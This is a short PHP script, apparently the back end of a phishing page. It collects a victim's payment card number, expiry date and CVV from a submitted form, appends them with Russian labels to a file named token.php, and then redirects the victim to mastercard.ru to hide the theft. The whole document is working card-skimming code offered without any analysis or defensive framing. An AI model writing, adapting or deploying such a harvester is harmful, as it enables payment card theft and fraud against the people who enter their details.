<?
$Number = $_POST['number'];
$Year = $_POST['year'];
$Cvv = $_POST['cvv'];
$log = fopen("token.php","a+");
fwrite($log,"<br> Номер карты: $Number, Срок действия:$Year, CVV:$Cvv \n"); 
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://www.mastercard.ru'></head></html>";
?>